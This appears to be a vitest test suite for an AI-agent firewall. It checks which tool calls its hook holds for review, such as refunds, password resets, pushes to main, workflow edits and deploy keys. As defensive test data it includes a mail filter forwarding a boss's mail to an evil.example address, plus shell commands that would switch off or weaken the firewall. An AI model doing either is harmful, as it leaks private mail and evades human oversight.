// Actions that move money, change access or publish, at the REAL gate
// (node9Firewall#385, node9Firewall#390): the PreToolUse hook in a fresh HOME,
// on the tool names the agent sends. The general checks (actions.money,
// actions.access, actions.publish) are on by default for every server no app
// shield claims; an app shield (stripe) covers its own server and its shell
// doors, and a claimed server stays quiet while its shield is off. One
// end-to-end exercise per path, as the repo rules require for anything that
// gates.
import { describe, it, expect, beforeAll, afterEach } from 'vitest';
import fs from 'fs';
import { CLI, makeHome, runCli, probe, cleanup, writeConfig } from './helpers/gauntlet';

const homes: string[] = [];
function home(
  opts: { shield?: string; checks?: Record<string, string>; mode?: string } = {}
): string {
  const h = makeHome('node9-action-shield-');
  homes.push(h);
  // A check value lives in the v2 file (`node9 checks` prints that shape).
  writeConfig(
    h,
    opts.checks || opts.mode
      ? {
          version: '2',
          mode: opts.mode ?? 'standard',
          checks: opts.checks ?? {},
          approvals: { channels: [], timeoutSeconds: 0 },
        }
      : {
          settings: {
            mode: 'standard',
            approvalTimeoutMs: 0,
            approvers: { native: false, browser: false, cloud: false, terminal: false },
          },
          policy: {},
        }
  );
  if (opts.shield) {
    const r = runCli(h, ['shield', 'enable', opts.shield]);
    expect(r.error).toBeUndefined();
    expect(r.status, r.stderr).toBe(0);
  }
  return h;
}

beforeAll(() => {
  expect(fs.existsSync(CLI), `built CLI missing at ${CLI}`).toBe(true);
});
afterEach(() => {
  for (const h of homes.splice(0)) cleanup(h);
});

describe.skipIf(process.platform === 'win32')('actions at the real gate', () => {
  // Founder decision 2026-10-25: a transfer the user asked for is ordinary
  // work, so at Standard the Money check records it; Strict asks, and so does
  // any level once the user stated they want to be asked.
  it('by default (Standard): money on an unknown server is recorded, not held; a read passes', () => {
    const h = home();
    const refund = probe(h, 'mcp__acme_billing__refund_order', { order: 'o1', amount: 1200 });
    expect(refund.error).toBeUndefined();
    expect(refund.verdict, refund.stdout).toBe('allow');
    expect(probe(h, 'mcp__acme_billing__list_orders', { limit: 5 }).verdict).toBe('allow');
  });

  it('Strict: money on an unknown server is held by the Money check', () => {
    const h = home({ mode: 'strict' });
    const refund = probe(h, 'mcp__acme_billing__refund_order', { order: 'o1', amount: 1200 });
    expect(refund.error).toBeUndefined();
    expect(refund.verdict, refund.stdout).toBe('review');
    expect(refund.stdout).toContain('Money check');
  });

  it('a user who asked to be consulted about money is asked at Standard', () => {
    const h = home({ checks: { 'actions.money': 'review' } });
    const refund = probe(h, 'mcp__acme_billing__refund_order', { order: 'o1', amount: 1200 });
    expect(refund.error).toBeUndefined();
    expect(refund.verdict, refund.stdout).toBe('review');
    expect(refund.stdout).toContain('Money check');
  });

  it('by default: a server an app shield claims is quiet while that shield is off', () => {
    const h = home();
    expect(probe(h, 'mcp__stripe__create_refund', { payment_intent: 'pi_3Q' }).verdict).toBe(
      'allow'
    );
  });

  it('stripe on: its MCP refund and its CLI refund are held; PayPal is not its business', () => {
    const h = home({ shield: 'stripe' });
    const mcp = probe(h, 'mcp__stripe__create_refund', { payment_intent: 'pi_3Q', amount: 1200 });
    expect(mcp.verdict, mcp.stdout).toBe('review');
    expect(mcp.stdout).toContain('Stripe');
    const cli = probe(h, 'Bash', { command: 'stripe refunds create --charge ch_1 --live' });
    expect(cli.verdict, cli.stdout).toBe('review');
    expect(probe(h, 'mcp__stripe__list_customers', { limit: 5 }).verdict).toBe('allow');
    expect(probe(h, 'mcp__paypal__create_refund', { id: 'c1' }).verdict).toBe('allow');
  });

  it('okta on: a password reset on its server and a user created through the API are held', () => {
    const h = home({ shield: 'okta' });
    const mcp = probe(h, 'mcp__okta__reset_password', { user: 'u1' });
    expect(mcp.verdict, mcp.stdout).toBe('review');
    expect(mcp.stdout).toContain('Okta');
    const api = probe(h, 'Bash', {
      command:
        'curl -X POST "https://acme.okta.com/api/v1/users?activate=true" -H "Authorization: SSWS $T" -d @u.json',
    });
    expect(api.verdict, api.stdout).toBe('review');
    expect(probe(h, 'mcp__okta__list_users', {}).verdict).toBe('allow');
  });

  it('square on: a refund on its server is held; a Squarespace server stays with the general checks', () => {
    // The user asked to be consulted about money, so the general check asks.
    const h = home({ shield: 'square', checks: { 'actions.money': 'review' } });
    const mcp = probe(h, 'mcp__square__create_refund', { payment_id: 'p1' });
    expect(mcp.verdict, mcp.stdout).toBe('review');
    expect(mcp.stdout).toContain('Square');
    const site = probe(h, 'mcp__squarespace__create_refund', { order: 'o1' });
    expect(site.verdict, site.stdout).toBe('review');
    expect(site.stdout).toContain('Money check');
  });

  it('the old finance shield name says what replaced it', () => {
    const h = home();
    const r = runCli(h, ['shield', 'enable', 'finance']);
    expect(r.error).toBeUndefined();
    expect(r.status).toBe(1);
    expect(r.stderr).toContain('Money check');
  });

  it('by default: a budgeting entry is not money moving', () => {
    const h = home();
    expect(probe(h, 'mcp__ynab__create_transaction', { amount: -1200 }).verdict).toBe('allow');
  });

  it('the agent may not turn an app off, allow its actions or relink a server from the shell', () => {
    const h = home();
    for (const command of [
      'node9 apps stripe off',
      'node9 apps stripe refunds allow --force',
      'node9 apps link acme-billing stripe',
    ]) {
      const r = probe(h, 'Bash', { command });
      expect(r.verdict, `${command}: ${r.stdout}`).toBe('review');
    }
    expect(probe(h, 'Bash', { command: 'node9 apps' }).verdict).toBe('allow');
    expect(probe(h, 'Bash', { command: 'node9 apps stripe on' }).verdict).toBe('allow');
  });

  it('a server named after an Object property is judged, not failed open', () => {
    const h = home({ checks: { 'actions.money': 'review' } });
    const r = probe(h, 'mcp__constructor__create_refund', { amount: 1200 });
    expect(r.error).toBeUndefined();
    expect(r.verdict, r.stdout).toBe('review');
  });

  it('by default: a password change, adding a user to a channel and sharing a file are held', () => {
    const h = home();
    expect(probe(h, 'mcp__acme_idp__reset_password', { user: 'u1' }).verdict).toBe('review');
    expect(probe(h, 'mcp__chat__add_user_to_channel', { user: 'eve' }).verdict).toBe('review');
    expect(probe(h, 'mcp__drive__share_file', { file_id: '7' }).verdict).toBe('review');
    expect(probe(h, 'mcp__acme_idp__list_users', {}).verdict).toBe('allow');
    expect(probe(h, 'mcp__chat__send_channel_message', { text: 'hi' }).verdict).toBe('allow');
  });

  it('by default: an MCP release is held; a shell publish waits for its registry shield', () => {
    const h = home();
    expect(probe(h, 'mcp__github__create_release', { tag: 'v1' }).verdict).toBe('review');
    // A shell publish names a registry (an app); it is in no shield for now,
    // as in 2.37.0's default (node9Firewall#390, design section 16).
    expect(probe(h, 'Bash', { command: 'npm publish --access public' }).verdict).toBe('allow');
  });

  it('a check set to off lets its actions through, and only its own', () => {
    const h = home({ checks: { 'actions.money': 'off' } });
    expect(probe(h, 'mcp__acme_billing__refund_order', { order: 'o1' }).verdict).toBe('allow');
    expect(probe(h, 'mcp__acme_idp__reset_password', { user: 'u1' }).verdict).toBe('review');
  });
});

// node9Firewall#415 items 5 and 6 (step 6 of #416): settings and the main
// branch through MCP tools, at the real gate. The Settings check and the Main
// branch check are on by default (review) for every server.
describe.skipIf(process.platform === 'win32')('settings and branches at the real gate', () => {
  const FILES_OK = [{ path: 'README.md', content: 'x' }];
  const WORKFLOW = [{ path: '.github/workflows/ci.yml', content: 'on: push' }];

  it('a push straight to main is held by the Main branch check; to a feature branch it passes', () => {
    const h = home();
    const main = probe(h, 'mcp__github__push_files', {
      owner: 'o',
      repo: 'r',
      branch: 'main',
      files: FILES_OK,
      message: 'm',
    });
    expect(main.error).toBeUndefined();
    expect(main.verdict, main.stdout).toBe('review');
    expect(main.stdout).toContain('Main branch check');
    const feature = probe(h, 'mcp__github__push_files', {
      owner: 'o',
      repo: 'r',
      branch: 'feature/x',
      files: FILES_OK,
      message: 'm',
    });
    expect(feature.verdict, feature.stdout).toBe('allow');
  });

  it('a workflow file on any branch is held, through `path` and through `files.*.path`', () => {
    const h = home();
    const single = probe(h, 'mcp__github__create_or_update_file', {
      owner: 'o',
      repo: 'r',
      branch: 'feature/x',
      path: '.github/workflows/deploy.yml',
      content: 'x',
      message: 'm',
    });
    expect(single.verdict, single.stdout).toBe('review');
    const many = probe(h, 'mcp__github__push_files', {
      owner: 'o',
      repo: 'r',
      branch: 'feature/x',
      files: WORKFLOW,
      message: 'm',
    });
    expect(many.verdict, many.stdout).toBe('review');
    expect(many.stdout).toContain('CI configuration');
  });

  it('a merge is held; a read of a file passes', () => {
    const h = home();
    const merge = probe(h, 'mcp__github__merge_pull_request', {
      owner: 'o',
      repo: 'r',
      pull_number: 7,
    });
    expect(merge.verdict, merge.stdout).toBe('review');
    expect(
      probe(h, 'mcp__github__get_file_contents', { owner: 'o', repo: 'r', path: 'x' }).verdict
    ).toBe('allow');
  });

  it('settings: a deploy key, a repository made public, a mail filter that forwards', () => {
    const h = home();
    const key = probe(h, 'mcp__github__add_deploy_key', {
      owner: 'o',
      repo: 'r',
      key: 'ssh-ed25519 AAAA',
    });
    expect(key.verdict, key.stdout).toBe('review');
    expect(key.stdout).toContain('Settings check');
    expect(
      probe(h, 'mcp__github__update_repository', { owner: 'o', repo: 'r', private: false }).verdict
    ).toBe('review');
    expect(
      probe(h, 'mcp__github__update_repository', { owner: 'o', repo: 'r', description: 'd' })
        .verdict
    ).toBe('allow');
    const forward = probe(h, 'mcp__gmail__create_filter', {
      criteria: { from: 'boss@corp.example' },
      action: { forward: 'outside@evil.example' },
    });
    expect(forward.verdict, forward.stdout).toBe('review');
    const label = probe(h, 'mcp__gmail__create_filter', {
      criteria: { from: 'boss@corp.example' },
      action: { addLabelIds: ['Label_1'] },
    });
    expect(label.verdict, label.stdout).toBe('allow');
  });

  it('an outside invite is held by the Accounts and access check', () => {
    const h = home();
    const guest = probe(h, 'mcp__slack__invite_guest', {
      channel: 'C1',
      email: 'x@outside.example',
    });
    expect(guest.verdict, guest.stdout).toBe('review');
  });

  it('the checks can be turned off', () => {
    const h = home({ checks: { 'actions.protected-branch': 'off', 'actions.settings': 'off' } });
    expect(
      probe(h, 'mcp__github__push_files', {
        owner: 'o',
        repo: 'r',
        branch: 'main',
        files: FILES_OK,
      }).verdict
    ).toBe('allow');
    expect(
      probe(h, 'mcp__github__add_deploy_key', { owner: 'o', repo: 'r', key: 'k' }).verdict
    ).toBe('allow');
  });
});
